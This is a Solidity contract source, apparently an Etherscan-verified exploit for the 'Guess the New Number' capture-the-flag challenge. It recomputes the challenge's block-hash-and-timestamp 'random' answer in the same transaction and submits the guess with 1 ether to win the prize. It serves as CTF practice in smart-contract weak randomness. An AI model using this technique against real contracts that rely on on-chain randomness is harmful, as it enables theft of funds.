/**
 *Submitted for verification at Etherscan.io on 2022-07-19
*/

pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
}

contract CTFGuessTheNewNumber {
    IGuessTheNewNumberChallenge public guessInstance;

    function CTFGuessTheNewNumber() public payable{
        require(msg.value == 1 ether);
    }

    function setGuessMeAddress(address _address) public payable{
        guessInstance = IGuessTheNewNumberChallenge(_address);
    }
    
    function doCaptureByBlockNum(uint nBlockNum) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(nBlockNum), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function doCapture() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessInstance.guess.value(1 ether)(answer);
    }
}